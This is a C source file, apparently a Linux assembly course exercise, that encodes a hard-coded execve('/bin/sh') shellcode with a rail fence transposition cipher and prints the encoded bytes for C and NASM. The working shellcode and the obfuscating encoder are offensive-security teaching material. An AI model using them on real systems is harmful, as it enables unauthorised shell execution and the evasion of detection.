/* rf-encoder.c

Encodes characters using the rail fence method
Outputs into C and NASM format bytepcodes.  The bytecodes below
are shellcode to execute execve from the stack and was
written by Vivek Ramachandran of Securitytube as part of
his course in Linux assembly language programming.
Info: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

You can check the code for yourseldf with:

echo -ne "shellcode"|ndisasm -u u

It's always a good idea before you run someone else's bytecodes. 

Rail fence method:

Transposition cipher as described in Cryptology written by
Albrecht Beutelspacher and published by the Mathematical
Association of America, ISBN 0-88385-504-6

Implemented by John Pierce, CISSP, on May 10, 2013, remsanattexascarverdotcom


Method:  Best shown by example.  Encipher the word 'fredericksburg' with
a key of 4

	f     i     r		Result = l1+l2+l3+l4 = firrrcugeekbds
	 r   r c   u g
	  e e   k b
	   d	 s

This program was written by John W. Pierce, CISSP.  I enter it into
the public domain.  You are free to use and/or redistribute it without 
restriction, though attribution would be the right thing to do.  I hope
it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>



int	main() {

	int	l,j,k,p,t;	// length of string, counters and a toggle
	int	i[2];		// need two incrementers for algorithm
	unsigned char inp[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
	int	key = 5;
	unsigned char *buf;

	l = strlen(inp);

	printf("\n\nShellcode length: %d", l);
	printf("\n Key:	%d", key);
	if (key > l)	{
		printf("Key needs to be shorter than length of shellcode\n");
		exit(0);
	}
	// make a buffer to store cipher
	buf =  malloc(l);
	if (buf==0) {
		printf("\nmemory exhausted\n");
		exit(0);
	}
	p = 0;		// position in buf
	// do the transposition cipher
	for (j=0; j<key; j++) {
		i[0] = (j==key-1?j:key-j-1)*2;	
		i[1] = j==0?i[0]:j*2;		
		t = 1;
		k = j;
		buf[p] = inp[j];
		do {
			t = !t;
			k += i[t];
			p++;
			if (k<l)
				buf[p] = inp[k];
		} while (k<l);
	}
	// Now print the results
	printf("\n\n\"");
	for (p=0; p<l; p++)
		printf("\\x%02x",buf[p]);
	printf("\";\n\n");
	for (p=0; p<l; p++)
		printf("0x%02x,", buf[p]);
	printf("\n\n");
	// and clean up
	free(buf);
	exit(0);
}
		
